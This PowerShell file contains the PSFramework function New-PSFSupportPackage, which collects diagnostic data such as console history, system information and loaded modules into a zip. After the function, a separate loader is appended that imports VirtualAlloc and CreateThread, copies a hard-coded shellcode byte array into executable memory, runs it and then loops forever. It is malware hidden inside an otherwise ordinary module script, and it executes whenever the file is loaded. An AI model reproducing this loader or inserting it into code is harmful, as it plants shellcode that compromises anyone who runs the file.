function New-PSFSupportPackage
{

	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseShouldProcessForStateChangingFunctions", "")]
	[Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSAvoidUsingEmptyCatchBlock", "")]
	[CmdletBinding(HelpUri = 'https://psframework.org/documentation/commands/PSFramework/New-PSFSupportPackage')]
	param (
		[string]
		$Path = "$($env:USERPROFILE)\Desktop",
		
		[PSFramework.Utility.SupportData]
		$Include = 'All',
		
		[PSFramework.Utility.SupportData]
		$Exclude = 'None',
		
		[string[]]
		$Variables,
		
		[switch]
		$ExcludeError,
		
		[switch]
		[Alias('Silent')]
		$EnableException
	)
	
	begin
	{
		Write-PSFMessage -Level InternalComment -Message "Starting"
		Write-PSFMessage -Level Verbose -Message "Bound parameters: $($PSBoundParameters.Keys -join ", ")"
		
		
		function Get-ShellBuffer
		{
			[CmdletBinding()]
			param ()
			
			try
			{
				
				$rec = New-Object System.Management.Automation.Host.Rectangle
				$rec.Left = 0
				$rec.Right = $host.ui.rawui.BufferSize.Width - 1
				$rec.Top = 0
				$rec.Bottom = $host.ui.rawui.BufferSize.Height - 1
				
				
				$buffer = $host.ui.rawui.GetBufferContents($rec)
				
				
				$int = 0
				$lines = @()
				while ($int -le $rec.Bottom)
				{
					$n = 0
					$line = ""
					while ($n -le $rec.Right)
					{
						$line += $buffer[$int, $n].Character
						$n++
					}
					$line = $line.TrimEnd()
					$lines += $line
					$int++
				}
				
				
				$int = 0
				$temp = $lines[$int]
				while ($temp -eq "") { $int++; $temp = $lines[$int] }
				
				
				$z = $rec.Bottom
				$temp = $lines[$z]
				while ($temp -eq "") { $z--; $temp = $lines[$z] }
				
				
				$z--
				
				
				$temp = $lines[$z]
				while ($temp -eq "") { $z--; $temp = $lines[$z] }
				
				
				return $lines[$int .. $z]
			}
			catch { }
		}
		
	}
	process
	{
		$filePathXml = Join-Path $Path "powershell_support_pack_$(Get-Date -Format "yyyy_MM_dd-HH_mm_ss").cliDat"
		$filePathZip = $filePathXml -replace "\.cliDat$", ".zip"
		
		Write-PSFMessage -Level Critical -Message @"
Gathering information...
Will write the final output to: $filePathZip
$(Get-PSFConfigValue -FullName 'psframework.supportpackage.contactmessage' -Fallback '')
Be aware that this package contains a lot of information including your input history in the console.
Please make sure no sensitive data (such as passwords) can be caught this way.

Ideally start a new console, perform the minimal steps required to reproduce the issue, then run this command.
This will make it easier for us to troubleshoot and you won't be sending us the keys to your castle.
"@
		
		$hash = @{ }
		if (($Include -band 1) -and -not ($Exclude -band 1))
		{
			Write-PSFMessage -Level Important -Message "Collecting PSFramework logged messages (Get-PSFMessage)"
			$hash["Messages"] = Get-PSFMessage
		}
		if (($Include -band 2) -and -not ($Exclude -band 2))
		{
			Write-PSFMessage -Level Important -Message "Collecting PSFramework logged errors (Get-PSFMessage -Errors)"
			$hash["Errors"] = Get-PSFMessage -Errors
		}
		if (($Include -band 4) -and -not ($Exclude -band 4))
		{
			Write-PSFMessage -Level Important -Message "Trying to collect copy of console buffer (what you can see on your console)"
			$hash["ConsoleBuffer"] = Get-ShellBuffer
		}
		if (($Include -band 8) -and -not ($Exclude -band 8))
		{
			Write-PSFMessage -Level Important -Message "Collecting Operating System information (Win32_OperatingSystem)"
			$hash["OperatingSystem"] = Get-CimInstance -ClassName Win32_OperatingSystem
		}
		if (($Include -band 16) -and -not ($Exclude -band 16))
		{
			Write-PSFMessage -Level Important -Message "Collecting CPU information (Win32_Processor)"
			$hash["CPU"] = Get-CimInstance -ClassName Win32_Processor
		}
		if (($Include -band 32) -and -not ($Exclude -band 32))
		{
			Write-PSFMessage -Level Important -Message "Collecting Ram information (Win32_PhysicalMemory)"
			$hash["Ram"] = Get-CimInstance -ClassName Win32_PhysicalMemory
		}
		if (($Include -band 64) -and -not ($Exclude -band 64))
		{
			Write-PSFMessage -Level Important -Message "Collecting PowerShell & .NET Version (`$PSVersionTable)"
			$hash["PSVersion"] = $PSVersionTable
		}
		if (($Include -band 128) -and -not ($Exclude -band 128))
		{
			Write-PSFMessage -Level Important -Message "Collecting Input history (Get-History)"
			$hash["History"] = Get-History
		}
		if (($Include -band 256) -and -not ($Exclude -band 256))
		{
			Write-PSFMessage -Level Important -Message "Collecting list of loaded modules (Get-Module)"
			$hash["Modules"] = Get-Module
		}
		if ((($Include -band 512) -and -not ($Exclude -band 512)) -and (Get-Command -Name Get-PSSnapIn -ErrorAction SilentlyContinue))
		{
			Write-PSFMessage -Level Important -Message "Collecting list of loaded snapins (Get-PSSnapin)"
			$hash["SnapIns"] = Get-PSSnapin
		}
		if (($Include -band 1024) -and -not ($Exclude -band 1024))
		{
			Write-PSFMessage -Level Important -Message "Collecting list of loaded assemblies (Name, Version, and Location)"
			$hash["Assemblies"] = [appdomain]::CurrentDomain.GetAssemblies() | Select-Object CodeBase, FullName, Location, ImageRuntimeVersion, GlobalAssemblyCache, IsDynamic
		}
		if (Test-PSFParameterBinding -ParameterName "Variables")
		{
			Write-PSFMessage -Level Important -Message "Adding variables specified for export: $($Variables -join ", ")"
			$hash["Variables"] = $Variables | Get-Variable -ErrorAction Ignore
		}
		if (($Include -band 2048) -and -not ($Exclude -band 2048) -and (-not $ExcludeError))
		{
			Write-PSFMessage -Level Important -Message "Adding content of `$Error"
			$hash["PSErrors"] = @()
			foreach ($errorItem in $global:Error) { $hash["PSErrors"] += New-Object PSFramework.Message.PsfException($errorItem) }
		}
		if (($Include -band 4096) -and -not ($Exclude -band 4096))
		{
			if (Test-Path function:Get-DbatoolsLog)
			{
				Write-PSFMessage -Level Important -Message "Collecting dbatools logged messages (Get-DbatoolsLog)"
				$hash["DbatoolsMessages"] = Get-DbatoolsLog
				Write-PSFMessage -Level Important -Message "Collecting dbatools logged errors (Get-DbatoolsLog -Errors)"
				$hash["DbatoolsErrors"] = Get-DbatoolsLog -Errors
			}
		}
		
		$data = [pscustomobject]$hash
		
		try { $data | Export-PsfClixml -Path $filePathXml -ErrorAction Stop }
		catch
		{
			Stop-PSFFunction -Message "Failed to export dump to file!" -ErrorRecord $_ -Target $filePathXml
			return
		}
		
		try { Compress-Archive -Path $filePathXml -DestinationPath $filePathZip -ErrorAction Stop }
		catch
		{
			Stop-PSFFunction -Message "Failed to pack dump-file into a zip archive. Please do so manually before submitting the results as the unpacked xml file will be rather large." -ErrorRecord $_ -Target $filePathZip
			return
		}
		
		Remove-Item -Path $filePathXml -ErrorAction Ignore
	}
	end
	{
		Write-PSFMessage -Level InternalComment -Message "Ending"
	}
}

$gNC = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gNC -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xdc,0xd9,0x74,0x24,0xf4,0xbb,0x85,0xe7,0x3c,0x5c,0x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x5a,0x14,0x03,0x5a,0x91,0x05,0xc9,0xa0,0x71,0x4b,0x32,0x59,0x81,0x2c,0xba,0xbc,0xb0,0x6c,0xd8,0xb5,0xe2,0x5c,0xaa,0x98,0x0e,0x16,0xfe,0x08,0x85,0x5a,0xd7,0x3f,0x2e,0xd0,0x01,0x71,0xaf,0x49,0x71,0x10,0x33,0x90,0xa6,0xf2,0x0a,0x5b,0xbb,0xf3,0x4b,0x86,0x36,0xa1,0x04,0xcc,0xe5,0x56,0x21,0x98,0x35,0xdc,0x79,0x0c,0x3e,0x01,0xc9,0x2f,0x6f,0x94,0x42,0x76,0xaf,0x16,0x87,0x02,0xe6,0x00,0xc4,0x2f,0xb0,0xbb,0x3e,0xdb,0x43,0x6a,0x0f,0x24,0xef,0x53,0xa0,0xd7,0xf1,0x94,0x06,0x08,0x84,0xec,0x75,0xb5,0x9f,0x2a,0x04,0x61,0x15,0xa9,0xae,0xe2,0x8d,0x15,0x4f,0x26,0x4b,0xdd,0x43,0x83,0x1f,0xb9,0x47,0x12,0xf3,0xb1,0x73,0x9f,0xf2,0x15,0xf2,0xdb,0xd0,0xb1,0x5f,0xbf,0x79,0xe3,0x05,0x6e,0x85,0xf3,0xe6,0xcf,0x23,0x7f,0x0a,0x1b,0x5e,0x22,0x42,0xe8,0x53,0xdd,0x92,0x66,0xe3,0xae,0xa0,0x29,0x5f,0x39,0x88,0xa2,0x79,0xbe,0xef,0x98,0x3e,0x50,0x0e,0x23,0x3f,0x78,0xd4,0x77,0x6f,0x12,0xfd,0xf7,0xe4,0xe2,0x02,0x22,0x90,0xe7,0x94,0x0d,0xcd,0x7a,0xe6,0xe6,0x0c,0x7b,0xf6,0xdb,0x99,0x9d,0xa6,0x73,0xca,0x31,0x06,0x24,0xaa,0xe1,0xee,0x2e,0x25,0xdd,0x0e,0x51,0xef,0x76,0xa4,0xbe,0x46,0x2e,0x50,0x26,0xc3,0xa4,0xc1,0xa7,0xd9,0xc0,0xc1,0x2c,0xee,0x35,0x8f,0xc4,0x9b,0x25,0x67,0x25,0xd6,0x14,0x21,0x3a,0xcc,0x33,0xcd,0xae,0xeb,0x95,0x9a,0x46,0xf6,0xc0,0xec,0xc8,0x09,0x27,0x67,0xc0,0x9f,0x88,0x1f,0x2d,0x70,0x09,0xdf,0x7b,0x1a,0x09,0xb7,0xdb,0x7e,0x5a,0xa2,0x23,0xab,0xce,0x7f,0xb6,0x54,0xa7,0x2c,0x11,0x3d,0x45,0x0b,0x55,0xe2,0xb6,0x7e,0x67,0xde,0x60,0x46,0x1d,0x0e,0xb1;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$0qDs=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($0qDs.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$0qDs,0,0,0);for (;;){Start-sleep 60};

